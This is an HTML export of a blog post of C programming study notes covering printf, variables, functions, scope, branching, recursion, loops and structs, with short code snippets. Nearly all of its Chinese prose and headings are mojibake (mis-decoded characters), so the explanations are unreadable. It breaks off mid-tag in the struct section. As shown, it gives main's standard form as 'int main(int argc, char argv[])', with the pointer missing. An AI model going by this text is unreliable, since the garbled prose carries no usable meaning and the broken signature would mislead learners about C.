    <content type="html"><![CDATA[<h1 id="çç¢çŸ¥è¯†ç‚¹"><a href="#çç¢çŸ¥è¯†ç‚¹" class="headerlink" title="çç¢çŸ¥è¯†ç‚¹"></a>çç¢çŸ¥è¯†ç‚¹</h1><p>printf åˆ†æˆå¤šè¡Œå†™, ç”¨ <code>\</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">printf</span>(<span class="hljs-comment">&quot;Hello \</span><br>    World<span class="hljs-comment">&quot;);</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬äºŒç« -å¸¸é‡-å˜é‡å’Œè¡¨è¾¾å¼"><a href="#ç¬¬äºŒç« -å¸¸é‡-å˜é‡å’Œè¡¨è¾¾å¼" class="headerlink" title="ç¬¬äºŒç«  å¸¸é‡, å˜é‡å’Œè¡¨è¾¾å¼"></a>ç¬¬äºŒç«  å¸¸é‡, å˜é‡å’Œè¡¨è¾¾å¼</h1><h2 id="2-2-å¸¸é‡"><a href="#2-2-å¸¸é‡" class="headerlink" title="2.2 å¸¸é‡"></a>2.2 å¸¸é‡</h2><p>è½¬æ¢è¯´æ˜ (Conversion Specification) åˆè¢«ç§°ä¸ºå ä½ç¬¦ (placeholder). </p><h2 id="2-3-å˜é‡"><a href="#2-3-å˜é‡" class="headerlink" title="2.3 å˜é‡"></a>2.3 å˜é‡</h2><p>å˜é‡æ˜¯è®¡ç®—æœºå­˜å‚¨å™¨ä¸­çš„ä¸€å—å‘½åçš„ç©ºé—´, å¯ä»¥åœ¨é‡Œé¢å­˜å‚¨ä¸€ä¸ªå€¼, å­˜å‚¨çš„å€¼æ˜¯å¯ä»¥éšæ—¶å˜åŒ–çš„, æ‰€ä»¥æ‰å«åšå˜é‡.</p><p>å£°æ˜ (declaration) å’Œå®šä¹‰ (definition) çš„åŒºåˆ«:</p><ul><li>å®šä¹‰æ˜¯å£°æ˜çš„å­é›†, å¦‚æœä¸€ä¸ªå£°æ˜è¦æ±‚ç¼–è¯‘å™¨ä¸ºå®ƒåˆ†é…å­˜å‚¨ç©ºé—´, é‚£ä¹ˆä¹Ÿå¯ä»¥å«åšå®šä¹‰.</li></ul><p>å‡½æ•°å, å®å®šä¹‰, ç»“æ„ä½“æˆå‘˜ç­‰, åœ¨ C è¯­è¨€ä¸­è¿™äº›éƒ½è¢«ç»Ÿç§°ä¸ºæ ‡è¯†ç¬¦.</p><p>å…³é”®è¯ (keyword) å’Œä¿ç•™å­— (reserved word) æ˜¯ç›¸åŒçš„å«ä¹‰.</p><p>ä¸€èˆ¬æ¥è¯´åº”é¿å…ä½¿ç”¨ä»¥ä¸‹åˆ’çº¿å¼€å¤´çš„æ ‡è¯†ç¬¦.</p><h2 id="2-4-èµ‹å€¼"><a href="#2-4-èµ‹å€¼" class="headerlink" title="2.4 èµ‹å€¼"></a>2.4 èµ‹å€¼</h2><p>å˜é‡å£°æ˜ä¸­çš„ç±»å‹è¡¨æ˜è¿™ä¸ªå˜é‡ä»£è¡¨å¤šå¤§çš„å­˜å‚¨ç©ºé—´.</p><p>åˆå§‹åŒ–æ˜¯ä¸€ç§ç‰¹æ®Šçš„å£°æ˜, è€Œä¸æ˜¯ä¸€ç§èµ‹å€¼è¯­å¥.</p><h2 id="2-5-è¡¨è¾¾å¼"><a href="#2-5-è¡¨è¾¾å¼" class="headerlink" title="2.5 è¡¨è¾¾å¼"></a>2.5 è¡¨è¾¾å¼</h2><p>ä»»ä½•è¡¨è¾¾å¼éƒ½æœ‰å€¼å’Œç±»å‹ä¸¤ä¸ªåŸºæœ¬å±æ€§.</p><p>å¦‚æœä¸€ä¸ªæ“ä½œæ•°çš„å·¦å³ä¸¤ä¾§å„æœ‰ä¸€ä¸ªç›¸åŒä¼˜å…ˆçº§çš„è¿ç®—ç¬¦, è¿™ä¸ªæ“ä½œç¬¦å’Œå·¦è¾¹çš„è¿ç®—ç¬¦ç»“åˆè¿˜æ˜¯å’Œå³è¾¹çš„è¿ç®—ç¬¦ç»“åˆå–å†³äºè¿ç®—ç¬¦çš„ç»“åˆæ€§ (Associativity), ç›¸åŒä¼˜å…ˆçº§çš„è¿ç®—ç¬¦å…·æœ‰ç›¸åŒçš„ç»“åˆæ€§.</p><p>å‘ä¸‹å–æ•´çš„è¿ç®—ç§° Floor, å‘ä¸Šå–æ•´çš„è¿ç®—ç§° Ceiling.</p><p>char å‹æœ¬è´¨ä¸Šå°±æ˜¯æ•´æ•°, åªä¸è¿‡å–å€¼èŒƒå›´æ¯” int å°.</p><p>å­—ç¬¦ä¹Ÿå¯ä»¥ç”¨ ASCII ç è½¬ä¹‰åºåˆ—è¡¨ç¤º, è¿™ç§è½¬ä¹‰åºåˆ—ç”± <code>\</code> åŠ ä¸Š 1<del>3 ä¸ªå…«è¿›åˆ¶æ•°å­—ç»„æˆ, æˆ–è€…ç”± <code>\x</code> æˆ– <code>\X</code> åŠ ä¸Š 1</del>2 ä¸ªåå…­è¿›åˆ¶æ•°å­—ç»„æˆ, å¦‚ <code>\11</code> å’Œ <code>\x9</code> è¡¨ç¤º Tab å­—ç¬¦.</p><h1 id="ç¬¬3ç« -ç®€å•å‡½æ•°"><a href="#ç¬¬3ç« -ç®€å•å‡½æ•°" class="headerlink" title="ç¬¬3ç«  ç®€å•å‡½æ•°"></a>ç¬¬3ç«  ç®€å•å‡½æ•°</h1><p>å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ <code>()</code> æ˜¯ä¸€ç§åç¼€è¿ç®—ç¬¦.</p><p>å¤´æ–‡ä»¶ä¸€èˆ¬ä½äº <code>/usr/include</code> ç›®å½•ä¸‹.</p><p>æ•°å­¦å‡½æ•°ä½äº <code>libm.so</code> åº“æ–‡ä»¶ä¸­ (è¿™äº›åº“æ–‡ä»¶é€šå¸¸ä½äº <code>/lib</code>) ç›®å½•ä¸‹. gcc çš„ <code>-lm</code> é€‰é¡¹å‘Šè¯‰ç¼–è¯‘å™¨, æˆ‘ä»¬ç¨‹åºä¸­ç”¨åˆ°çš„æ•°å­¦å‡½æ•°è¦åœ¨è¿™ä¸ªåº“æ–‡ä»¶é‡Œé¢æ‰¾.</p><p>å¾ˆå¤šåº“å‡½æ•°å¦‚ printf, éƒ½ä½äº <code>libc.so</code> åº“æ–‡ä»¶ä¸­, ä½¿ç”¨ <code>libc.so</code> ä¸­çš„åº“å‡½æ•°åœ¨ç¼–è¯‘æ—¶ä¸éœ€è¦åŠ  <code>-lc</code> é€‰é¡¹, è¿™ä¸ªé€‰é¡¹ä¸º gcc çš„é»˜è®¤é€‰é¡¹.</p><h2 id="C-æ ‡å‡†åº“å’Œ-glibc"><a href="#C-æ ‡å‡†åº“å’Œ-glibc" class="headerlink" title="C æ ‡å‡†åº“å’Œ glibc"></a>C æ ‡å‡†åº“å’Œ glibc</h2><p>è§ä¹¦.</p><p>glibc æä¾›ä¸€ç»„å¤´æ–‡ä»¶å’Œä¸€ç»„åº“æ–‡ä»¶, å‡ ä¹æ‰€æœ‰ C ç¨‹åºéƒ½ä¾èµ–äº libc.so, ä¹Ÿæœ‰å¾ˆå¤š C ç¨‹åºä¾èµ–äºå…¶ä»–åº“æ–‡ä»¶.</p><h2 id="3-2-è‡ªå®šä¹‰å‡½æ•°"><a href="#3-2-è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="3.2 è‡ªå®šä¹‰å‡½æ•°"></a>3.2 è‡ªå®šä¹‰å‡½æ•°</h2><p>main å‡½æ•°çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºæ‰§è¡Œç¨‹åºæ—¶å®ƒè‡ªåŠ¨è¢«æ“ä½œç³»ç»Ÿè°ƒç”¨, æ„æ€å°±æ˜¯, æˆ‘ä»¬ä¸éœ€è¦å•ç‹¬å†å†™ä¸€ä¸ª <code>main()</code> æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°.</p><p>main å‡½æ•°çš„è¿”å›å€¼æ˜¯ç»™æ“ä½œç³»ç»Ÿçœ‹çš„, å› ä¸º main å‡½æ•°æ˜¯è¢«æ“ä½œç³»ç»Ÿè°ƒç”¨çš„, é€šå¸¸ç¨‹åºæ‰§è¡ŒæˆåŠŸå°±è¿”å› 0 , åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™å°±è¿”å›ä¸€ä¸ªéé›¶å€¼.</p><p>main å‡½æ•°æœ€æ ‡å‡†çš„å½¢å¼æ˜¯ <code>int main(int argc, char argv[])</code></p><p>è¯­æ³•ä¸Šè§„å®šæ²¡æœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨è¡¨è¾¾å¼æ˜¯ void ç±»å‹, æœ‰ä¸€ä¸ª void ç±»å‹çš„å€¼.</p><p>è¯­ä¹‰ä¸Šè§„å®š void ç±»å‹ä¸èƒ½å‚ä¸è¿ç®—.</p><p>è¿™ç§ <code>void threeline(void);</code> å£°æ˜äº†ä¸€ä¸ªå‡½æ•°çš„åç§°, å‚æ•°ç±»å‹å’Œä¸ªæ•°, è¿”å›å€¼ç±»å‹çš„ç§°ä¸ºå‡½æ•°åŸå‹. åªæœ‰å¸¦å‡½æ•°ä½“çš„å£°æ˜æ‰å«åšå®šä¹‰.</p><p>å‡½æ•°åŸå‹ä¼šä¸ºç¼–è¯‘å™¨æä¾›æœ‰ç”¨çš„ä¿¡æ¯, ç¼–è¯‘å™¨åœ¨ç¿»è¯‘ä»£ç çš„è¿‡ç¨‹ä¸­, åªæœ‰è§åˆ°å‡½æ•°åŸå‹ä¹‹åæ‰çŸ¥é“è¿™ä¸ªå‡½æ•°çš„åç§°, å‚æ•°ç±»å‹å’Œè¿”å›å€¼, è¿™æ ·åœ¨å‡½æ•°è°ƒç”¨æ—¶æ‰çŸ¥é“å¦‚ä½•ç”ŸæˆæŒ‡ä»¤.</p><p>æ²¡æœ‰å‡½æ•°å£°æ˜æ—¶, ä¼šæœ‰å‡½æ•°çš„éšå¼å£°æ˜ (implicit declaration), éšå¼å£°æ˜çš„å‡½æ•°è¿”å›å€¼ç±»å‹éƒ½æ˜¯ int.</p><p>C è¯­è¨€è§„å®šäº†ä¸€ç§ç‰¹æ®Šçš„å‚æ•°åˆ—è¡¨æ ¼å¼:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span><br></code></pre></td></tr></table></figure><p><code>...</code> è¡¨ç¤º 0 ä¸ªæˆ–ä»»æ„å¤šä¸ªå‚æ•°, è¿™äº›å‚æ•°çš„ç±»å‹ä¹Ÿå¯ä»¥æ˜¯ä¸ç¡®å®šçš„, è¿™è¢«ç§°ä½œå¯å˜å‚æ•° (variable argument).</p><p>æœ‰æ—¶å€™æˆ‘ä»¬æŠŠå‡½æ•°å«åšæ¥å£ (interface), è°ƒç”¨å‡½æ•°å°±æ˜¯ä½¿ç”¨è¿™ä¸ªæ¥å£, ä½¿ç”¨æ¥å£çš„å‰ææ˜¯å¿…é¡»å’Œæ¥å£ä¿æŒä¸€è‡´.</p><p>æ³¨æ„åŒºåˆ†ç”¨æˆ·å‘½ä»¤å’Œç³»ç»Ÿç®¡ç†å‘½ä»¤, ç”¨æˆ·å‘½ä»¤é€šå¸¸ä½äº <code>/bin</code> å’Œ <code>/usr/bin</code> ç›®å½•ä¸‹, ç³»ç»Ÿç®¡ç†å‘½ä»¤é€šå¸¸ä½äº <code>/sbin</code> å’Œ <code>/usr/sbin</code> ç›®å½•ä¸‹. ä¸€èˆ¬ç”¨æˆ·å¯ä»¥æ‰§è¡Œç”¨æˆ·å‘½ä»¤, è€Œæ‰§è¡Œç³»ç»Ÿç®¡ç†å‘½ä»¤ä¸€èˆ¬éœ€è¦ root æƒé™.</p><h2 id="3-4-å…¨å±€å˜é‡-å±€éƒ¨å˜é‡å’Œä½œç”¨åŸŸ"><a href="#3-4-å…¨å±€å˜é‡-å±€éƒ¨å˜é‡å’Œä½œç”¨åŸŸ" class="headerlink" title="3.4 å…¨å±€å˜é‡, å±€éƒ¨å˜é‡å’Œä½œç”¨åŸŸ"></a>3.4 å…¨å±€å˜é‡, å±€éƒ¨å˜é‡å’Œä½œç”¨åŸŸ</h2><p>å±€éƒ¨å˜é‡ (Local Variable) åœ¨æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶åˆ†é…å­˜å‚¨ç©ºé—´, åœ¨æ¯æ¬¡å‡½æ•°è¿”å›æ—¶é‡Šæ”¾å­˜å‚¨ç©ºé—´.</p><p>å…¨å±€å˜é‡ (Globle Variable), å®šä¹‰åœ¨æ‰€æœ‰å‡½æ•°ä½“ä¹‹å¤–, å®ƒä»¬åœ¨ç¨‹åºå¼€å§‹è¿è¡Œæ—¶åˆ†é…å­˜å‚¨ç©ºé—´, åœ¨ç¨‹åºç»“æŸæ—¶é‡Šæ”¾å­˜å‚¨ç©ºé—´.</p><p>è¦æ³¨æ„, å±€éƒ¨å˜é‡å¯ä»¥ç”¨ç±»å‹ç›¸ç¬¦çš„ä»»æ„è¡¨è¾¾å¼æ¥åˆå§‹åŒ–, è€Œå…¨å±€å˜é‡åªèƒ½ç”¨å¸¸é‡è¡¨è¾¾å¼ (Constant Expression) æ¥åˆå§‹åŒ–.</p><p>ç¨‹åºåœ¨å¼€å§‹è¿è¡Œæ—¶è¦ç”¨é€‚å½“çš„å€¼æ¥åˆå§‹åŒ–å…¨å±€å˜é‡, æ‰€ä»¥åˆå§‹å€¼å¿…é¡»ä¿å­˜åœ¨ç¼–è¯‘ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­, å› æ­¤åˆå§‹å€¼åœ¨ç¼–è¯‘æ—¶å°±è¦è®¡ç®—å‡ºæ¥.</p><p>å…¨å±€å˜é‡åœ¨å®šä¹‰æ—¶ä¸è¢«åˆå§‹åŒ–åˆ™å…¶åˆå§‹å€¼æ˜¯ 0, å¦‚æœå±€éƒ¨å˜é‡åœ¨å®šä¹‰æ—¶ä¸åˆå§‹åŒ–åˆ™å…¶åˆå§‹å€¼æ˜¯ä¸ç¡®å®šçš„.</p><p>å†™éå®šä¹‰çš„å‡½æ•°å£°æ˜æ—¶å‚æ•°å¯ä»¥åªå†™ç±»å‹è€Œä¸èµ·å, å¦‚ <code>void print_time(int, int)</code> åªè¦å‘Šè¯‰ç¼–è¯‘å™¨å‚æ•°ç±»å‹æ˜¯ä»€ä¹ˆ, ç¼–è¯‘å™¨å°±èƒ½ä¸º <code>print_time(23, 59)</code> å‡½æ•°è°ƒç”¨ç”Ÿæˆæ­£ç¡®çš„æŒ‡ä»¤.</p><p>åœ¨ä¸€ä¸ªå‡½æ•°ä¸­å¯ä»¥å£°æ˜å¦ä¸€ä¸ªå‡½æ•°, ä½†ä¸èƒ½å®šä¹‰å¦ä¸€ä¸ªå‡½æ•°.</p><h1 id="ç¬¬4ç« -åˆ†æ”¯è¯­å¥"><a href="#ç¬¬4ç« -åˆ†æ”¯è¯­å¥" class="headerlink" title="ç¬¬4ç«  åˆ†æ”¯è¯­å¥"></a>ç¬¬4ç«  åˆ†æ”¯è¯­å¥</h1><h2 id="4-2-if-x2F-else-è¯­å¥"><a href="#4-2-if-x2F-else-è¯­å¥" class="headerlink" title="4.2 if&#x2F;else è¯­å¥"></a>4.2 if&#x2F;else è¯­å¥</h2><p>åœ¨ C è¯­è¨€ä¸­, ä»»ä½•å…è®¸å‡ºç°è¯­å¥çš„åœ°æ–¹, æ—¢å¯ä»¥æ˜¯ç”±åˆ†å·ç»“å°¾çš„ä¸€æ¡è¯­å¥, ä¹Ÿå¯ä»¥æ˜¯ç”± <code>&#123;&#125;</code> æ‰©èµ·æ¥çš„è‹¥å¹²æ¡è¯­å¥æˆ–å£°æ˜ç»„æˆçš„è¯­å¥å— (Statement Block).</p><p>æ¯ä¸€ä¸ª Statement Block ä¸­éƒ½æ˜¯ä¸€ä¸ªå±€éƒ¨ä½œç”¨åŸŸ, å¦‚:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    &#123;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    &#125;    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¼šæŠ¥é”™.</p><p>C è¯­è¨€è§„å®š, <code>%</code> è¿ç®—ç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»æ˜¯æ•´å‹.</p><p><code>%</code> è¿ç®—ç¬¦çš„ç»“æœæ€»æ˜¯ä¸è¢«é™¤æ•°åŒå·, å³ <code>a%b</code> ä¸­çš„ a.</p><p>æµ®ç‚¹å€¼çš„ç²¾åº¦æœ‰é™, ä¸é€‚åˆç”¨ <code>==</code> è¿ç®—ç¬¦åšç²¾ç¡®æ¯”è¾ƒ.</p><h2 id="4-3-å¸ƒå°”ä»£æ•°"><a href="#4-3-å¸ƒå°”ä»£æ•°" class="headerlink" title="4.3 å¸ƒå°”ä»£æ•°"></a>4.3 å¸ƒå°”ä»£æ•°</h2><p>é€»è¾‘è¿ç®—çš„æ•°å­¦ä½“ç³»ç§°ä¸ºå¸ƒå°”ä»£æ•° (Boolean Algebra). åœ¨ç¼–ç¨‹è¯­è¨€ä¸­è¡¨ç¤ºçœŸå’Œå‡çš„æ•°æ®ç±»å‹å«å¸ƒå°”ç±»å‹, åœ¨ C è¯­è¨€ä¸­é€šå¸¸ç”¨ int å‹è¡¨ç¤º.</p><h2 id="4-4-switch-è¯­å¥"><a href="#4-4-switch-è¯­å¥" class="headerlink" title="4.4 switch è¯­å¥"></a>4.4 switch è¯­å¥</h2><p>æ³¨æ„å‡ ç‚¹:</p><ul><li>case åé¢çš„è¡¨è¾¾å¼å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼, è¿™ä¸ªå€¼å’Œå…¨å±€å˜é‡ä¸€æ ·å¿…é¡»åœ¨ç¼–è¯‘æ—¶è®¡ç®—å‡ºæ¥</li><li>æµ®ç‚¹å‹ä¸é€‚åˆåšç²¾ç¡®æ¯”è¾ƒ, å› æ­¤ case åé¢å¿…é¡»ä¸ºæ•´å‹å¸¸é‡è¡¨è¾¾å¼. </li><li>è¿›å…¥ case å¦‚æœæ²¡æœ‰é‡åˆ° break è¯­å¥å°±ä¼šä¸€ç›´å¾€ä¸‹æ‰§è¡Œ.</li></ul><p>æœ‰æ—¶å€™ç¼–è¯‘å™¨ä¼šå¯¹ switch è¯­å¥è¿›è¡Œæ•´ä½“çš„ä¼˜åŒ–, ä½¿å®ƒæ¯”ç­‰ä»·çš„ if&#x2F;else è¯­å¥ç”Ÿæˆçš„æŒ‡ä»¤æ•ˆç‡æ›´é«˜.</p><h1 id="ç¬¬5ç« -æ·±å…¥ç†è§£å‡½æ•°"><a href="#ç¬¬5ç« -æ·±å…¥ç†è§£å‡½æ•°" class="headerlink" title="ç¬¬5ç«  æ·±å…¥ç†è§£å‡½æ•°"></a>ç¬¬5ç«  æ·±å…¥ç†è§£å‡½æ•°</h1><h2 id="5-1-return-è¯­å¥"><a href="#5-1-return-è¯­å¥" class="headerlink" title="5.1 return è¯­å¥"></a>5.1 return è¯­å¥</h2><p>åœ¨æ²¡æœ‰è¿”å›å€¼çš„å‡½æ•°ä¸­ä¹Ÿèƒ½ä½¿ç”¨ return è¯­å¥.</p><p>åœ¨æœ‰è¿”å›å€¼çš„å‡½æ•°ä¸­, returm è¯­å¥çš„ä½œç”¨æ˜¯æä¾›æ•´ä¸ªå‡½æ•°çš„è¿”å›å€¼, ç»“æŸå½“å‰å‡½æ•°å¹¶è¿”å›åˆ°è°ƒç”¨å®ƒçš„åœ°æ–¹.</p><p>è¿”å›å¸ƒå°”å€¼çš„å‡½æ•°æ˜¯ä¸€ç±»éå¸¸æœ‰ç”¨çš„å‡½æ•°, åœ¨ç¨‹åºä¸­å……å½“æ§åˆ¶è¡¨è¾¾å¼, å‡½æ•°åé€šå¸¸å¸¦æœ‰ if æˆ– is ç­‰è¡¨ç¤ºåˆ¤æ–­çš„è¯, è¿™ç±»å‡½æ•°ä¹Ÿå«åšè°“è¯ (Predicate). </p><p>å‡½æ•°çš„è¿”å›å€¼åº”è¯¥è¿™æ ·ç†è§£: å‡½æ•°è¿”å›ä¸€ä¸ªå€¼ç›¸å½“äºå®šä¹‰ä¸€ä¸ªä¸è¿”å›å€¼ç±»å‹ç›¸åŒçš„ä¸´æ—¶å˜é‡å¹¶ç”¨ return åé¢çš„è¡¨è¾¾å¼æ¥åˆå§‹åŒ–.</p><p>è™½ç„¶å‡½æ•°çš„è¿”å›å€¼å¯ä»¥çœ‹ä½œä¸´æ—¶å˜é‡, ä½†æˆ‘ä»¬åªæ˜¯è¯»ä¸€ä¸‹å®ƒçš„å€¼, è¯»å®Œå€¼å°±é‡Šæ”¾å®ƒ.</p><h2 id="5-3-é€’å½’"><a href="#5-3-é€’å½’" class="headerlink" title="5.3 é€’å½’"></a>5.3 é€’å½’</h2><p>å¦‚æœå®šä¹‰ä¸€ä¸ªæ¦‚å¿µéœ€è¦ç”¨åˆ°è¿™ä¸ªæ¦‚å¿µæœ¬èº«, æˆ‘ä»¬ç§°å®ƒçš„å®šä¹‰æ˜¯é€’å½’çš„ (Recursive).</p><p>æœ€å…³é”®çš„æ˜¯éœ€è¦å®šä¹‰ä¸€ä¸ªåŸºç¡€æ¡ä»¶ (Base Case).</p><p>å †æ ˆæˆ–æ ˆ (stack) ä¸­, éšç€å‡½æ•°è°ƒç”¨å’Œè¿”å›ä¸æ–­å˜åŒ–çš„è¿™ä¸€ç«¯ç§°ä¸ºæ ˆé¡¶, æ¯ä¸ªå‡½æ•°è°ƒç”¨çš„å‚æ•°å’Œå±€éƒ¨å˜é‡çš„å­˜å‚¨ç©ºé—´ç§°ä¸ºä¸€ä¸ªæ ˆå¸§ (Stack Frame). æ“ä½œç³»ç»Ÿä¸ºç¨‹åºçš„è¿è¡Œé¢„ç•™äº†ä¸€å—æ ˆç©ºé—´, å‡½æ•°è°ƒç”¨æ—¶å°±åœ¨è¿™ä¸ªæ ˆç©ºé—´å†…åˆ†é…æ ˆå¸§, å‡½æ•°è¿”å›æ—¶å°±é‡Šæ”¾æ ˆå¸§.</p><p>ç”¨æ•°å­¦å½’çº³æ³• (Mathematical Induction) æ¥è¯æ˜åªéœ€è¦è¯æ˜ä¸¤ç‚¹: Base Case æ­£ç¡®å’Œé€’æ¨å…³ç³»æ­£ç¡®.</p><p>æ“ä½œç³»ç»Ÿä¸ºç¨‹åºé¢„ç•™çš„æ ˆç©ºé—´è€—å°½å¯¼è‡´ç¨‹åºå´©æºƒå³ <mark>æ®µé”™è¯¯</mark>.</p><h1 id="ç¬¬6ç« -å¾ªç¯è¯­å¥"><a href="#ç¬¬6ç« -å¾ªç¯è¯­å¥" class="headerlink" title="ç¬¬6ç«  å¾ªç¯è¯­å¥"></a>ç¬¬6ç«  å¾ªç¯è¯­å¥</h1><p> C è¯­è¨€è§„å®š, å¦‚æœæ§åˆ¶è¡¨è¾¾å¼ 2 ä¸ºç©º, åˆ™è®¤ä¸ºæ§åˆ¶è¡¨è¾¾å¼ 2 çš„å€¼ä¸ºçœŸ:<br> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">æ§åˆ¶è¡¨è¾¾å¼ <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>while (æ§åˆ¶è¡¨è¾¾å¼ <span class="hljs-number">2</span>) &#123;<br>   è¯­å¥<br>   æ§åˆ¶è¡¨è¾¾å¼ <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure></p><p> <code>i++</code> å’Œ <code>++i</code> çš„åŒºåˆ«åœ¨äºè¿”å›å€¼ä¸åŒ.</p><p> ç¼–è¯‘çš„è¿‡ç¨‹åˆ†ä¸ºè¯æ³•è§£æå’Œè¯­æ³•è§£æä¸¤ä¸ªé˜¶æ®µ, åœ¨è¯æ³•è§£æé˜¶æ®µ, ç¼–è¯‘å™¨æ€»æ˜¯ä»å‰åˆ°åæ‰¾åˆ°æœ€é•¿çš„åˆæ³• token.</p><p> C99 è§„å®šä¸€ç§æ–°çš„ for å¾ªç¯è¯­æ³•:<br> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(int i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++ )</span></span><br></code></pre></td></tr></table></figure><br>ç¼–è¯‘æ—¶ gcc éœ€è¦åŠ ä¸Š <code>-std=c99</code> é€‰é¡¹. </p><p>äº‹å®ä¸Š, <code>default</code> å’Œ <code>case</code> è¯­å¥éƒ½æ˜¯ç‰¹æ®Šçš„æ ‡å·.</p><h1 id="ç¬¬7ç« -ç»“æ„ä½“"><a href="#ç¬¬7ç« -ç»“æ„ä½“" class="headerlink" title="ç¬¬7ç«  ç»“æ„ä½“"></a>ç¬¬7ç«  ç»“æ„ä½“</h1><p>ç±»å‹å®šä¹‰ä¹Ÿæ˜¯ä¸€ç§å£°æ˜, å£°æ˜éƒ½è¦ä»¥ <code>;</code> ç»“å°¾. å¦‚:</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs thrift"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">complex_struct</span> </span>&#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>comlex_struct</code> ä¸º tag.</p><p>è‹¥åœ¨å®šä¹‰ç»“æ„ä½“ç±»å‹çš„åŒæ—¶å®šä¹‰äº†å˜é‡, ä¹Ÿå¯ä»¥ä¸ç”¨å†™ tag:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125; z1, z2;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæˆå‘˜çš„å­˜å‚¨ç©ºé—´æ˜¯ç›¸é‚»çš„.</p><p>ç»“æ„ä½“å˜é‡ä¹Ÿå¯ä»¥åœ¨å®šä¹‰æ—¶åˆå§‹åŒ–:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">struct</span> complex_struct z = &#123; <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span> &#125;;<br></code></pre></td></tr></table></figure><p>Initializer ä¸­æ•°æ®ä¸å¤Ÿåˆ™åˆå§‹åŒ–ä¸º 0.</p><p><code>&#123;&#125;</code> è¿™ç§è¯­æ³•ä¸èƒ½ç”¨äºç»“æ„ä½“çš„èµ‹å€¼, ä¸€ä¸‹è¯­å¥ä¸ºé”™è¯¯:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">struct</span> complex_struct z1;<br><span class="hljs-attribute">z1</span> = &#123; <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure><p>Designated Initializer çš„è¯­æ³•:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct complex_struct z1 <span class="hljs-operator">=</span> &#123; .y <span class="hljs-operator">=</span> <span class="hljs-number">4.0</span> &#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ç»“æ„ä½“ç±»å‹åœ¨è¡¨è¾¾å¼ä¸­æœ‰å¾ˆå¤šé™åˆ¶, ä¸åƒåŸºæœ¬ç±»å‹é‚£ä¹ˆè‡ªç”±.</p><p>ç»“æ„ä½“å˜é‡ä¹‹é—´å¯ä»¥ç›¸äº’èµ‹å€¼å’Œåˆå§‹åŒ–, ä¹Ÿå¯ä»¥å½“ä½œå‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼æ¥ä¼ é€’.</p><h2 id="7-3-æ•°æ®ç±»å‹æ ‡å¿—"><a href="#7-3-æ•°æ®ç±»å‹æ ‡å¿—" class="headerlink" title="7.3 æ•°æ®ç±»å‹æ ‡å¿—"></a>7.3 æ•°æ®ç±»å‹æ ‡å¿—</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span 